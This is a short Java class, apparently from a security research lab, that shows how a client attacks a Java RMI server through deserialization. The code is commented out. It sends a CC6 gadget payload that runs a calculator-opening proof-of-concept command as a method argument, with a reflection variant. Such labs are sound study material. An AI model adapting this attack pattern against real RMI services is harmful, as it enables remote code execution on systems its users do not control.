package server;

import utils.Serializer;

import java.lang.reflect.Method;


/**
 * @author Whoopsunix
 *
 * Client 攻击 Server
 */
public class AttackRMIClient {
    public static void main(String[] args) throws Exception {
        /**
         * 参数攻击
         */
//        Object annotationInvocationHandler = Serializer.cc6("open -a Calculator.app");
//        VulRemoteInterface vulRemoteInterface = (VulRemoteInterface) java.rmi.Naming.lookup("rmi://192.168.66.143:1099/xxx");
//        vulRemoteInterface.sayHello(annotationInvocationHandler);

        /**
         * 参数攻击2
         */
//        Object annotationInvocationHandler = Serializer.cc6("open -a Calculator.app");
//        VulRemoteInterface vulRemoteInterface = (VulRemoteInterface) java.rmi.Naming.lookup("rmi://192.168.66.143:1099/xxx");
//        vulRemoteInterface.sayUser(annotationInvocationHandler);
//        // 反射
//        Method method = vulRemoteInterface.getClass().getMethod("sayUser", Object.class);
//        method.invoke(vulRemoteInterface, annotationInvocationHandler);

    }
}
